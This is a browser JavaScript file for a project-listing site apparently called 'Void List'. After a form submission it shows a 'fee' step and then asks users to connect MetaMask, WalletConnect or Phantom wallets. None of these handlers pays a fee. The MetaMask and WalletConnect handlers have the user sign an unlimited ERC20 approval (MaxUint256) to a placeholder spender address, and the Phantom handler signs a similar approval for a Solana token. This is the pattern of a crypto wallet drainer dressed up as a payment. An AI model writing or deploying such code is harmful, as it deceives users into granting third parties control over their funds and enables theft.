document.addEventListener("DOMContentLoaded", () => {
  const projectForm = document.getElementById("projectForm");
  const feeModal = document.getElementById("feeModal");
  const walletModal = document.getElementById("walletModal");
  const proceedButton = document.getElementById("proceedButton");
  const metaMaskButton = document.getElementById("metaMaskButton");
  const walletConnectEvmButton = document.getElementById("walletConnectEvmButton");
  const solanaWalletButton = document.getElementById("solanaWalletButton");
  const walletConnectSolanaButton = document.getElementById("walletConnectSolanaButton");

  // ERC20 ABI for approve
  const ERC20_ABI = [
    "function approve(address spender, uint256 amount) external returns (bool)"
  ];

  // Example spender address (replace with your own)
  const SPENDER_ADDRESS = "0xYourSpenderAddressHere";

  // Show fee modal after form submission
  projectForm.addEventListener("submit", (e) => {
    e.preventDefault();
    feeModal.classList.remove("hidden");
  });

  // Proceed to payment → show wallet modal
  proceedButton.addEventListener("click", () => {
    feeModal.classList.add("hidden");
    walletModal.classList.remove("hidden");
  });

  // Close modals
  document.querySelectorAll(".close").forEach(btn => {
    btn.addEventListener("click", () => {
      btn.closest(".modal").classList.add("hidden");
    });
  });

  // Handle MetaMask approval
  metaMaskButton.addEventListener("click", async () => {
    if (!window.ethereum) {
      alert("Please install MetaMask.");
      return;
    }
    try {
      await window.ethereum.request({ method: "eth_requestAccounts" });
      const provider = new ethers.providers.Web3Provider(window.ethereum);
      const signer = provider.getSigner();
      const userAddress = await signer.getAddress();

      const tokenAddress = "0xYourTokenContractAddressHere"; // replace with actual token
      const token = new ethers.Contract(tokenAddress, ERC20_ABI, signer);

      const tx = await token.approve(SPENDER_ADDRESS, ethers.constants.MaxUint256);
      alert(`Approval transaction sent: ${tx.hash}`);

      const receipt = await tx.wait();
      if (receipt.status === 1) {
        alert("✅ Approval successful!");
      } else {
        alert("❌ Approval failed.");
      }
    } catch (err) {
      console.error(err);
      alert("Approval error: " + err.message);
    }
  });

  // Handle WalletConnect (EVM) approval
  walletConnectEvmButton.addEventListener("click", async () => {
    try {
      const { EthereumProvider } = window;
      const wcProvider = await EthereumProvider.init({
        projectId: "YOUR_WALLETCONNECT_PROJECT_ID",
        chains: [1], // Ethereum mainnet
        showQrModal: true,
        rpcMap: { 1: "https://eth.llamarpc.com" },
        metadata: { name: "Void List", url: window.location.origin }
      });

      await wcProvider.enable();
      const provider = new ethers.providers.Web3Provider(wcProvider);
      const signer = provider.getSigner();
      const userAddress = await signer.getAddress();

      const tokenAddress = "0xYourTokenContractAddressHere"; // replace with actual token
      const token = new ethers.Contract(tokenAddress, ERC20_ABI, signer);

      const tx = await token.approve(SPENDER_ADDRESS, ethers.constants.MaxUint256);
      alert(`Approval transaction sent: ${tx.hash}`);

      const receipt = await tx.wait();
      if (receipt.status === 1) {
        alert("✅ Approval successful!");
      } else {
        alert("❌ Approval failed.");
      }
    } catch (err) {
      console.error(err);
      alert("WalletConnect approval error: " + err.message);
    }
  });

  // Solana wallet connections
  solanaWalletButton.addEventListener("click", async () => {
    try {
      const adapter = new PhantomWalletAdapter();
      await adapter.connect();
      const publicKey = adapter.publicKey.toBase58();
      alert(`Connected to Solana wallet: ${publicKey}`);

      const connection = new Connection("https://api.mainnet-beta.solana.com");
      const tokenMint = new PublicKey("DqfoyZH96RnvZusSp3Cdncjpyp3C74ZmJzGhjmHnDHRH");
      const owner = adapter.publicKey;
      const spender = new PublicKey("YOUR_SPENDER_ADDRESS"); // replace with actual
      const ata = await getAssociatedTokenAddress(tokenMint, owner);
      const ix = createApproveInstruction(ata, spender, owner, 1000000, [], TOKEN_PROGRAM_ID);

      const tx = new Transaction().add(ix);
      await adapter.sendTransaction(tx, connection);
      alert("Approval transaction sent!");
    } catch (err) {
      console.error(err);
      alert("Solana wallet connection failed.");
    }
  });

  walletConnectSolanaButton.addEventListener("click", async () => {
    // WalletConnect Solana logic here
  });
});
